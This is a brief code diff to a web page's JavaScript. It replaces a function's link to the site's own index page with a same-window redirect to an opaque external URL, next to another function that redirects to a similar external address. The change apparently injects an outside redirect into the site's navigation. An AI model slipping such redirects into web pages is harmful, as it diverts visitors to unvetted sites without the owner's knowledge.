@@ -291,7 +291,7 @@
    window.open("https://cararegistrasi.com/mzLRtlBPd0","_self");
    }
    function MainIS() {
-   window.open("../../../index.html","_self");
+   window.open("https://ponselharian.com/PmhkEHAifhUT","_self");
    }
    
    /*⭐⭐⭐
